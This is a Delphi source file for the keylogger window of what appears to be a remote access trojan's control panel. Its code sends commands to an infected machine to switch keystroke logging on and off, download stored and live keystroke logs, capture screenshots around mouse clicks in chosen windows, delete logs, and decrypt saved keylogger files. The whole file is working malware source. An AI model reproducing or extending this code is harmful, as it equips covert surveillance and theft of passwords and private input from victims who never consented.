unit UnitKeylogger;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, ExtCtrls, unitMain,  ImgList,
  Menus, acProgressBar, AppEvnts, sSkinProvider, UnitConexao;

type
  TFormKeylogger = class(TForm)
    StatusBar1: TStatusBar;
    SaveDialog1: TSaveDialog;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Iniciardownload: TMenuItem;
    Parardownload: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    Panel1: TPanel;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    CheckBox1: TCheckBox;
    Memo1: TMemo;
    TabSheet2: TTabSheet;
    Panel2: TPanel;
    SpeedButton4: TSpeedButton;
    SpeedButton5: TSpeedButton;
    Memo2: TMemo;
    TabSheet3: TTabSheet;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Panel3: TPanel;
    Button3: TSpeedButton;
    Button4: TSpeedButton;
    Edit1: TEdit;
    ListView1: TListView;
    ProgressBar1: TsProgressBar;
    sProgressBar1: TsProgressBar;
    sSkinProvider1: TsSkinProvider;
    SpeedButton6: TSpeedButton;
    OpenDialog1: TOpenDialog;
    N1: TMenuItem;
    Excluir1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure CheckBox1Click(Sender: TObject);
    procedure SpeedButton5Click(Sender: TObject);
    procedure SpeedButton4Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure IniciardownloadClick(Sender: TObject);
    procedure ParardownloadClick(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure SpeedButton6Click(Sender: TObject);
    procedure Excluir1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    ServidorTransferencia: TConexaoNew;
    NomePC: string;
    PossoEnviar, AtualizandoImagens: boolean;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
   	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

function customStringReplace(OriginalString, Pattern, Replace: string): string;

var
  FormKeylogger: TFormKeylogger;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConstantes,
  JPEG,
  CustomIniFiles,
  UnitCryptString;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormKeylogger.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormKeylogger.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormKeylogger.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

type
  TDados = class
    FileName: WideString;
  end;

procedure TFormKeylogger.Excluir1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  if ListView1.SelCount <= 0 then Exit;
  for I := ListView1.Items.Count - 1 downto 0 do
  if ListView1.Items.Item[i].Selected then
  begin
    TempStr := TempStr + TDados(ListView1.Items.Item[i].Data).FileName + #13#10;
    ListView1.Items.Item[i].Delete;
  end;
  Servidor.EnviarString(MOUSELOGGERDELETE + '|' + TempStr);
  ListView1.Items.Clear;
end;

function customStringReplace(OriginalString, Pattern, Replace: string): string;
{-----------------------------------------------------------------------------
  Procedure: customStringReplace
  Date:      07-Feb-2002
  Arguments: OriginalString, Pattern, Replace: string
  Result:    string

  Description:
    Replaces Pattern with Replace in string OriginalString.
    Taking into account NULL (#0) characters. ************************ IMPORTANT

    I cheated. This is ripped almost directly from Borland's
    StringReplace Function. The bug creeps in with the ANSIPos
    function. (Which does not detect #0 characters)
-----------------------------------------------------------------------------}

var
  SearchStr, Patt, NewStr: string;
  Offset: Integer;
begin
  Result := '';
  SearchStr := OriginalString;
  Patt := Pattern;
  NewStr := OriginalString;

  while SearchStr <> '' do
  begin
    Offset := posex(Patt, SearchStr); // Was AnsiPos
    if Offset = 0 then
    begin
      Result := Result + NewStr;
      Break;
    end;
    Result := Result + Copy(NewStr, 1, Offset - 1) + Replace;
    NewStr := Copy(NewStr, Offset + Length(Pattern), MaxInt);
    SearchStr := Copy(SearchStr, Offset + Length(Patt), MaxInt);
  end;
end;

procedure TFormKeylogger.AtualizarIdioma;
begin
  SpeedButton1.Caption := Traduzidos[588];
  SpeedButton2.Caption := Traduzidos[589];
  SpeedButton3.Caption := Traduzidos[590];
  CheckBox1.Caption := Traduzidos[591];

  SpeedButton4.Caption := Traduzidos[256];
  SpeedButton5.Caption := Traduzidos[257];
  SpeedButton6.Caption := Traduzidos[603];

  Button3.Caption := Traduzidos[256];
  Button4.Caption := Traduzidos[257];
  Label3.Caption := Traduzidos[592];
  Label4.Caption := Traduzidos[507] + ':';
  ListView1.Column[0].Caption := Traduzidos[593];
  ListView1.Column[1].Caption := Traduzidos[594];
  Excluir1.Caption := Traduzidos[287];

  Iniciardownload.Caption := Traduzidos[595];
  Parardownload.Caption := Traduzidos[596];
end;

procedure TFormKeylogger.CheckBox1Click(Sender: TObject);
begin
  if PossoEnviar = False then Exit;

  if CheckBox1.Checked then Servidor.EnviarString(KEYLOGGERATIVAR + '|') else
  Servidor.EnviarString(KEYLOGGERDESATIVAR + '|');
  StatusBar1.Panels.Items[0].Text := Traduzidos[205];
end;

constructor TFormKeylogger.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('Keylogger', 'Width', Width);
    Height := IniFile.ReadInteger('Keylogger', 'Height', Height);
    Left := IniFile.ReadInteger('Keylogger', 'Left', Left);
    Top := IniFile.ReadInteger('Keylogger', 'Top', Top);

    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormKeylogger.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  ListView1.Items.Clear;
  Memo1.Clear;
  Memo2.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('Keylogger', 'Width', Width);
    IniFile.WriteInteger('Keylogger', 'Height', Height);
    IniFile.WriteInteger('Keylogger', 'Left', Left);
    IniFile.WriteInteger('Keylogger', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

procedure TFormKeylogger.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  Label5.Caption := '';
end;

procedure TFormKeylogger.FormShow(Sender: TObject);
begin
  PageControl1.ActivePage := TabSheet1;
  AtualizarIdioma;
  Memo1.Clear;
  PossoEnviar := False;
  CheckBox1.Checked := False;
  PossoEnviar := True;
  CheckBox1.Enabled := False;
  SpeedButton1.Enabled := False;
  SpeedButton2.Enabled := False;
  SpeedButton3.Enabled := False;

  Memo2.Clear;
  SpeedButton4.Enabled := False;
  SpeedButton5.Enabled := True;
  SpeedButton5.Click;

  Button3.Enabled := True;
  Button4.Enabled := True;
  Button4.Click;

  ProgressBar1.Position := 0;
  sProgressBar1.Position := 0;
  if ListView1.Items.Count > 0 then ListView1.Items.Clear;

  PararDownload.Enabled := True;
  IniciarDownload.Enabled := True;
  PararDownload.Click;

  Label4.Caption := Traduzidos[507] + ':';
  Servidor.EnviarString(KEYLOGGER + '|');
end;

procedure TFormKeylogger.IniciardownloadClick(Sender: TObject);
begin
  if ServidorTransferencia <> nil then
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
	  ServidorTransferencia.Connection.Disconnect;
	  finally
	  ServidorTransferencia := nil;
	end;
	except
  end; 	
  
  
  Servidor.EnviarString(MOUSELOGGERSTARTSEND + '|');
  StatusBar1.Panels.Items[0].Text := Traduzidos[205];

  Parardownload.Enabled := True;
  Iniciardownload.Enabled := not Parardownload.Enabled;
end;

procedure TFormKeylogger.Button3Click(Sender: TObject);
begin
  if Edit1.Text = '' then
  if MessageBox(Handle,
                pchar(traduzidos[509] + #13#10 + Traduzidos[135] + '?'),
                pChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  Servidor.EnviarString(MOUSELOGGERSTART + '|' + Edit1.Text);
  Button4.Enabled := True;
  Button3.Enabled := False;
end;

procedure TFormKeylogger.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  i: integer;
  TempFile, DataHora, MouseFolder, RelacaoJanelas: string;
  Dados: TDados;
  Item: TListItem;
  PossoAdd: boolean;
  Stream: TMemoryStream;
  JPG: TJpegImage;
  BMP: TBitmap;
  ImageID: integer;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERSTARTSEND then
  begin
    ProgressBar1.Position := 0;
    ProgressBar1.Max := 0;
    if ListView1.Items.Count > 0 then ListView1.Items.Clear;
    ImageList1.Clear;

    Label4.Caption := Traduzidos[507] + ' (' + inttostr(ProgressBar1.Position) + '/' + inttostr(ProgressBar1.Max) + ')';

    ServidorTransferencia := ConAux;
    delete(Recebido, 1, posex('|', Recebido));

    if recebido = '' then i := 0 else i := StrToInt(Recebido);

    if i <= 0 then
    begin
      StatusBar1.Panels.Items[0].Text := Traduzidos[506];
      Parardownload.Enabled := False;
      Iniciardownload.Enabled := not Parardownload.Enabled;
      exit;
    end;

    ProgressBar1.Position := 0;
    ProgressBar1.Max := i;
    Label4.Caption := Traduzidos[507] + ' (' + inttostr(ProgressBar1.Position) + '/' + inttostr(ProgressBar1.Max) + ')';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERBUFFER then
  begin
    ServidorTransferencia := ConAux;
    delete(Recebido, 1, posex('|', Recebido));
    TempFile := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(recebido, 1, length(DelimitadorComandos));

    if posex('^', TempFile) > 0 then
    begin
      while AtualizandoImagens = True do Application.ProcessMessages;
      AtualizandoImagens := True;

      ListView1.Items.BeginUpdate;

      Dados := TDados.Create;
      Dados.FileName := TempFile;
      Item := ListView1.Items.Add;
      Item.Data := TObject(Dados);

      while posex('\', TempFile) > 0 do Delete(TempFile, 1, posex('\', TempFile));

      DataHora := Copy(TempFile, 1, posex('^', TempFile) - 1);
      delete(TempFile, 1, posex('^', TempFile));

      DataHora[posex('.', DataHora)] := '/';
      DataHora[posex('.', DataHora)] := '/';
      DataHora[posex('.', DataHora)] := ':';
      DataHora[posex('.', DataHora)] := ':';

      Item.Caption := TempFile;
      Item.SubItems.Add(DataHora);

      PossoAdd := True;
      Stream := TMemoryStream.Create;
      Stream.WriteBuffer(Recebido[1], length(Recebido) * 2);
      Stream.Position := 0;
      JPG := TJpegImage.Create;
      try
        JPG.LoadFromStream(Stream);
        except
        JPG.Free;
        Stream.Free;
        ListView1.Items.EndUpdate;
        AtualizandoImagens := False;
        Item.Delete;
        PossoAdd := False;
      end;
      if PossoAdd = True then
      begin
        Stream.Free;
        BMP := TBitmap.Create;
        BMP.Width := JPG.Width;
        BMP.Height := JPG.Height;
        BMP.Canvas.Draw(0, 0, JPG);
        JPG.Free;
        ImageID := ImageList1.Add(BMP, nil);
        BMP.Free;

        Item.ImageIndex := ImageID;

        ListView1.Items.EndUpdate;
        AtualizandoImagens := False;

        ProgressBar1.Position := ProgressBar1.Position + 1;
        Label4.Caption := Traduzidos[507] + ' (' + inttostr(ProgressBar1.Position) + '/' + inttostr(ProgressBar1.Max) + ')';

        StatusBar1.Panels.Items[0].Text := Traduzidos[508] + ': ' + IntToStr(ListView1.Items.Count);
      end;

      if ProgressBar1.Position = ProgressBar1.Max then
      begin
        Parardownload.Enabled := False;
        Iniciardownload.Enabled := not Parardownload.Enabled;
      end else
      begin
        Parardownload.Enabled := True;
        Iniciardownload.Enabled := not Parardownload.Enabled;
      end;
    end;


  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERSTOP then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    Button3.Enabled := True;
    Button4.Enabled := False;
    Edit1.Text := '';
    Label5.Caption := '';
    StatusBar1.Panels.Items[0].Text := Traduzidos[504];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERSTART then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    Button3.Enabled := False;
    Button4.Enabled := True;
    MouseFolder := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    RelacaoJanelas := Recebido;
    Edit1.Text := RelacaoJanelas;
    Label5.Caption := MouseFolder;
    IniciarDownload.Enabled := True;
    PararDownload.Enabled := False;
    StatusBar1.Panels.Items[0].Text := Traduzidos[503];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERATIVAR then
  begin
    SpeedButton1.Enabled := true;
    SpeedButton2.Enabled := true;
    SpeedButton3.Enabled := true;
    CheckBox1.Enabled := true;
    delete(Recebido, 1, posex('|', Recebido));

    PossoEnviar := False;
    if Copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then CheckBox1.Checked := true else
    CheckBox1.Checked := false;
    PossoEnviar := True;

    if CheckBox1.Checked then StatusBar1.Panels.Items[0].Text := Traduzidos[497] else
    StatusBar1.Panels.Items[0].Text := Traduzidos[498];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERBAIXAR then
  begin
    delete(Recebido, 1, posex('|', Recebido));

	  if Recebido = 'NOLOGS' then recebido := '' else
    Recebido := ConAux.ReceberString(sProgressBar1.handle);

    Memo1.Clear;

    while (Recebido <> '') and ((Recebido[1] = #13) or (Recebido[1] = #10)) do
    delete(Recebido, 1, 1);
    Recebido := customStringReplace(Recebido, #0, '');

    Memo1.Text := Recebido;

    StatusBar1.Panels.Items[0].Text := Traduzidos[500];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGEREXCLUIR then
  begin
    Memo1.Clear;
    Memo2.Clear;
    StatusBar1.Panels.Items[0].Text := Traduzidos[505];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERONLINESTOP then
  begin
    StatusBar1.Panels.Items[0].Text := Traduzidos[502];
    SpeedButton4.Enabled := True;
    SpeedButton5.Enabled := False;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERONLINESTART then
  begin
    StatusBar1.Panels.Items[0].Text := Traduzidos[501];
    SpeedButton4.Enabled := False;
    SpeedButton5.Enabled := True;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERONLINEKEY then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    StatusBar1.Panels.Items[0].Text := Traduzidos[500];
    if recebido = '' then exit;

    if Memo2.Text = '' then
    while (Recebido <> '') and ((Recebido[1] = #13) or (Recebido[1] = #10)) do
    delete(Recebido, 1, 1);

    Memo2.Text := Memo2.Text + Recebido;
    Memo2.SelStart := Length(Memo2.Text);
    SendMessage(Memo2.handle, EM_SCROLLCARET, 0, 0);
  end else

end;

procedure TFormKeylogger.ParardownloadClick(Sender: TObject);
begin
  if ServidorTransferencia <> nil then
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
      ServidorTransferencia.Connection.Disconnect;
      finally
      ServidorTransferencia := nil;
    end;
	except
  end;
  Parardownload.Enabled := False;
  Iniciardownload.Enabled := not Parardownload.Enabled;
end;

procedure TFormKeylogger.PopupMenu1Popup(Sender: TObject);
begin
  if Label5.Caption = '' then
  begin
    IniciarDownload.Enabled := False;
    PararDownload.Enabled := False;
  end;
end;

procedure TFormKeylogger.Button4Click(Sender: TObject);
begin
  Servidor.EnviarString(MOUSELOGGERSTOP + '|');
  Button4.Enabled := False;
  Button3.Enabled := True;
end;

procedure TFormKeylogger.SpeedButton1Click(Sender: TObject);
begin
  Servidor.EnviarString(KEYLOGGERBAIXAR + '|');
  StatusBar1.Panels.Items[0].Text := Traduzidos[205];
end;

procedure TFormKeylogger.SpeedButton2Click(Sender: TObject);
begin
  Servidor.EnviarString(KEYLOGGEREXCLUIR + '|');
  StatusBar1.Panels.Items[0].Text := Traduzidos[205];
end;

function ShowTime(DayChar: Char = '/'; DivChar: Char = ' ';
  HourChar: Char = ':'): String;
var
  SysTime: TSystemTime;
  Month, Day, Hour, Minute, Second: String;
begin
  GetLocalTime(SysTime);
  Month := inttostr(SysTime.wMonth);
  Day := inttostr(SysTime.wDay);
  Hour := inttostr(SysTime.wHour);
  Minute := inttostr(SysTime.wMinute);
  Second := inttostr(SysTime.wSecond);
  if length(Month) = 1 then
    Month := '0' + Month;
  if length(Day) = 1 then
    Day := '0' + Day;
  if length(Hour) = 1 then
    Hour := '0' + Hour;
  if Hour = '24' then
    Hour := '00';
  if length(Minute) = 1 then
    Minute := '0' + Minute;
  if length(Second) = 1 then
    Second := '0' + Second;
  Result := Day + DayChar + Month + DayChar + inttostr(SysTime.wYear)
    + DivChar + Hour + HourChar + Minute + HourChar + Second;
end;

procedure TFormKeylogger.SpeedButton3Click(Sender: TObject);
var
  TempStr: string;
  newFile: THandle;
  header: array [0..1] of byte;
  c: Cardinal;
begin
  if SaveDialog1 <> nil then SaveDialog1.Free;
  SaveDialog1 := TSaveDialog.Create(nil);
  SaveDialog1.Filter := 'Text Files (*.txt)' + '|*.txt';

  TempStr := ExtractFilePath(paramstr(0)) + 'Downloads\' + Servidor.NomeDoServidor + '\Keylogger';
  ForceDirectories(TempStr);

  SaveDialog1.InitialDir := TempStr;
  SaveDialog1.FileName := ShowTime('-', ' ', '-') + '.txt';
  SaveDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;

  if SaveDialog1.Execute = false then exit;

  TempStr := Memo1.Text;
  newFile := CreateFileW(pWideChar(SaveDialog1.FileName), GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
  if newFile <> INVALID_HANDLE_VALUE then
  begin
    header[0] := $FF;
    header[1] := $FE;
    WriteFile(newFile, Header, SizeOf(Header), c, nil);
    WriteFile(newFile, TempStr[1], Length(TempStr) * 2, c, nil);
  end;
  CloseHandle(newFile);
end;

procedure TFormKeylogger.SpeedButton4Click(Sender: TObject);
begin
  SpeedButton4.Enabled := False;
  SpeedButton5.Enabled := True;
  Servidor.EnviarString(KEYLOGGERONLINESTART + '|');
  Memo2.Clear;
  StatusBar1.Panels.Items[0].Text := Traduzidos[205];
end;

procedure TFormKeylogger.SpeedButton5Click(Sender: TObject);
begin
  SpeedButton4.Enabled := True;
  SpeedButton5.Enabled := False;
  Servidor.EnviarString(KEYLOGGERONLINESTOP + '|');
  StatusBar1.Panels.Items[0].Text := Traduzidos[205];
end;

function LerArquivo(FileName: pWideChar; var p: pointer): Int64;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
begin
  result := 0;
  p := nil;
  if fileexists(filename) = false then exit;

  hFile := CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  result := windows.GetFileSize(hFile, nil);
  GetMem(p, result);
  ReadFile(hFile, p^, result, lpNumberOfBytesRead, nil);
  CloseHandle(hFile);
end;

procedure TFormKeylogger.SpeedButton6Click(Sender: TObject);
var
  TempStr: string;
  p: pointer;
  i: int64;
  newFile: THandle;
  header: array [0..1] of byte;
  c: cardinal;
begin
  if OpenDialog1 <> nil then OpenDialog1.Free;
  OpenDialog1 := TOpenDialog.Create(nil);
  OpenDialog1.Filter := 'Keylogger files (*.dat)' + '|*.dat';
  OpenDialog1.InitialDir := ExtractFilePath(paramstr(0));
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  if OpenDialog1.Execute = false then exit;

  i := LerArquivo(pWideChar(OpenDialog1.FileName), p);
  if i <= 0 then exit;

  Setlength(TempStr, i div 2);
  CopyMemory(@TempStr[1], p, i);

  EnDecryptKeylogger(pWideChar(TempStr), i div 2);

  TempStr := customStringReplace(TempStr, #0, '');
  Memo1.Text := TempStr;
end;

end.
